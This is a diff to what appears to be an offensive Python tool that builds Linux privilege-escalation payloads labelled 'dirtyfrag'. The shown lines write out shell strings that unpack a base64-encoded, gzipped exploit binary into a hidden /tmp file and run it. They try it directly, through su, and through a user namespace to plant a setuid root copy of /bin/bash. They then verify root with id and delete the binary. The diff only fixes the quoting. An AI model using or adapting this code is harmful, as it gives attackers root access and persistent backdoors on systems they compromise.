@@ -665,9 +665,9 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
         return (
             f"BD={bd}; T=/tmp/.{tag}df; "
             f"printf '%s' '{b64}' | base64 -d | gunzip > $T; chmod +x $T; "
-            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | $T 2>&1; "
+            f"printf \"cp /bin/bash $BD; chmod +s $BD; exit\\n\" | $T 2>&1; "
             f"if [ ! -u \"$BD\" ]; then "
-            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; fi; "
+            f"printf \"cp /bin/bash $BD; chmod +s $BD; exit\\n\" | /usr/bin/su 2>/dev/null; fi; "
             f"if [ -u \"$BD\" ]; then "
             f"echo '[privesc:ok] dirtyfrag'; $BD -p -c 'id'; "
             f"else echo '[privesc:fail] dirtyfrag'; fi; rm -f $T"
@@ -710,7 +710,7 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
             f"printf '%s' '{df_b64}' | base64 -d | gunzip > \"$T\"",
             "chmod +x \"$T\"",
             # attempt 1: direct (no namespace) — real root if kernel exploit succeeds
-            "printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | \"$T\" 2>&1",
+            "printf \"cp /bin/bash $BD; chmod +s $BD; exit\\n\" | \"$T\" 2>&1",
             "if ! [ -u \"$BD\" ] || [ \"$(stat -c %u \"$BD\" 2>/dev/null)\" != \"0\" ]; then",
             # attempt 2: via user namespace (namespace caps may unlock exploit path)
             "    rm -f \"$BD\" 2>/dev/null",
@@ -770,9 +770,9 @@ def _build_privesc_auto(tag: str) -> "str | None":
         parts.append(
             f"if [ -z \"$DONE\" ]; then "
             f"T=/tmp/.{tag}df; printf '%s' '{b64df}' | base64 -d | gunzip > $T; chmod +x $T; "
-            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | $T 2>&1; "
+            f"printf \"cp /bin/bash $BD; chmod +s $BD; exit\\n\" | $T 2>&1; "
             f"if [ ! -u \"$BD\" ]; then "
-            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; fi; "
+            f"printf \"cp /bin/bash $BD; chmod +s $BD; exit\\n\" | /usr/bin/su 2>/dev/null; fi; "
             f"rm -f $T; "
             f"if [ -u \"$BD\" ]; then echo '[privesc:ok] dirtyfrag'; $BD -p -c 'id'; DONE=1; fi; "
             f"[ -z \"$DONE\" ] && echo '[privesc:fail] dirtyfrag'; fi"
